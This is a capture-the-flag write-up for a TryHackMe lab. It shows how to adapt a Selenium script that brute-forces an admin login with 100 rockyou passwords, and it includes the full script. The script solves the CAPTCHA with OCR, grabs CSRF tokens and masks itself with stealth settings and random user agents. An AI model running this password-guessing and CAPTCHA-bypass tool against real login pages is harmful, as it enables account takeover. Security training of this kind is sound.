------------

Can you guess the password of the admin user and log in to the dashboard?
**Note**: Use the first 100 lines of rockyou.txt

----------------------------

Remember back to https://tryhackme.com/room/customtoolingviabrowserautomation?taskNo=4&sharerId=675407a1fac0372dd248e5b3

There was a script already built for this, bonus we can also use the lab same box for this challenge. 

Start the lab: https://tryhackme.com/room/customtoolingviabrowserautomation
Start the captchapocalypse lab


make a copy of lab2.py, encase we mess it up

```
cp ~/Desktop/101Selenium/lab2.py ~/Desktop/101Selenium/apocalypse.py
```

make a 100 lines of rockyou into a wordlist e.g from attackbox 

```
head -n 100 /usr/share/wordlists/rockyou.txt > /tmp/rock100.txt
```
 
 Host file for
```
cd /tmp
python3 -m http.server  
```
 
Back on the Custom Tooling box download the list, 
```
cd ~/Desktop/101Selenium/
wget http://<<attackboxip>>:8000/rock100.txt
```

Now for the fun stuff, edit our apocalypse.py

```
nano ~/Desktop/101Selenium/apocalypse.py
```

On the script update the ip to match the target ip
```
ip = 'http://10.49.147.106'
```

Replace
```
passwords = ["123456", "admin", "letmein", "password123", "password"]
```

with our trimmed rock you

```
passwords = [p.rstrip() for p in open("~/Desktop/101Selenium/rock100.txt")]
```

if we run the script now, it will seem to work but never finds the login. What i found you have to update 

```
        chrome.find_element(By.TAG_NAME, "form").submit()
```

to 

```
        chrome.find_element(By.ID, "login-btn").click()
```

Why you ask, 

- `submit()` forces a raw form submission (often defaults to **GET** which it does in this case)
- `click()` triggers the **button click event**, so any JavaScript (`fetch`, `xhr`, `form handler`) attached to it will run and this challenge runs a login() javascript, so now correctly gets sent by post.  


Now save and run your python with

```
cd ~/Desktop/101Selenium/
source env/bin/activate
python3 apocalypse.py
```

If you don't get the successful login, run again as the script is not well built e.g using a sleep rather than checking if ready it can fail and take a few attempts.  

## How i troubleshooted when the script looked working, but was not as it was using get.

Added the following in the options section, and opened zap, ran script and found it was using get. some research then suggest what i found about click v submit. 


```
# send all browser traffic through proxy
proxy_host = "127.0.0.1"
proxy_port = "8080"  # Burp or mitmproxy default
options.add_argument(f"--proxy-server=http://{proxy_host}:{proxy_port}")
```

## Final script, with commented out proxy settings 


```
from selenium.webdriver.common.by import By
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from selenium_stealth import stealth

import time
from fake_useragent import UserAgent
from PIL import Image, ImageEnhance, ImageFilter
import pytesseract
import io
import os

# Create folder for saving CAPTCHA images
os.makedirs("captchas", exist_ok=True)

options = Options()
ua = UserAgent()
userAgent = ua.random
options.add_argument('--no-sandbox')
options.add_argument('--headless')
options.add_argument("start-maximized")
options.add_argument(f'user-agent={userAgent}')
options.add_argument('--disable-dev-shm-usage')
options.add_argument('--disable-cache')
options.add_argument('--disable-gpu')
#proxy_host = "127.0.0.1"
#proxy_port = "8080"  # Burp or mitmproxy default
#options.add_argument(f"--proxy-server=http://{proxy_host}:{proxy_port}")

options.binary_location = "/usr/bin/google-chrome"
service = Service(executable_path='chromedriver-linux64/chromedriver')
chrome = webdriver.Chrome(service=service, options=options)

stealth(chrome,
    languages=["en-US", "en"],
    vendor="Google Inc.",
    platform="Win32",
    webgl_vendor="Intel Inc.",
    renderer="Intel Iris OpenGL Engine",
    fix_hairline=True,
)

# CONFIG
ip = 'http://10.49.147.106'
login_url = f'{ip}/index.php'
dashboard_url = f'{ip}/dashboard.php'

username = "admin"
#passwords = ["123456", "admin", "letmein", "password123", "password"]
passwords = [p.rstrip() for p in open("~/Desktop/101Selenium/rock100.txt")]
for password in passwords:
    while True:
        chrome.get(login_url)
        time.sleep(1)

        # Grab CSRF token
        csrf = chrome.find_element(By.NAME, "csrf_token").get_attribute("value")

        # Get CAPTCHA image rendered in-browser
        captcha_img_element = chrome.find_element(By.TAG_NAME, "img")
        captcha_png = captcha_img_element.screenshot_as_png

        # Preprocess image for OCR
        image = Image.open(io.BytesIO(captcha_png)).convert("L")
        image = image.resize((image.width * 2, image.height * 2), Image.LANCZOS)  # Resize for clarity
        image = image.filter(ImageFilter.SHARPEN)
        image = ImageEnhance.Contrast(image).enhance(2.0)
        image = image.point(lambda x: 0 if x < 140 else 255, '1')

        # OCR the CAPTCHA
        captcha_text = pytesseract.image_to_string(
            image,
            config='--psm 7 -c tessedit_char_whitelist=ABCDEFGHIJKLMNOPQRSTUVWXYZ23456789'
        ).strip().replace(" ", "").replace("\n", "").upper()

        # Save the image for review
        image.save(f"captchas/captcha_{password}_{captcha_text}.png")

        if not captcha_text.isalnum() or len(captcha_text) != 5:
            print(f"[!] OCR failed (got: '{captcha_text}'), retrying...")
            continue

        print(f"[*] Trying password: {password} with CAPTCHA: {captcha_text}")

        # Fill out and submit the form
        chrome.find_element(By.NAME, "username").send_keys(username)
        chrome.find_element(By.NAME, "password").send_keys(password)
        chrome.find_element(By.NAME, "captcha_input").send_keys(captcha_text)
        chrome.find_element(By.ID, "login-btn").click()
        time.sleep(1)

        print("=== HTML Output After Submit ===")
        print(chrome.page_source)
        print("================================")

        if dashboard_url in chrome.current_url:
            print(f"[+] Login successful with password: {password}")
            try:
                flag = chrome.find_element(By.TAG_NAME, "p").text
                print(f"[+] {flag}")
            except:
                print("[!] Logged in, but no flag found.")
            chrome.quit()
            exit()
        else:
            print(f"[-] Failed login with: {password}")
            break  # try next password
chrome.quit()

```
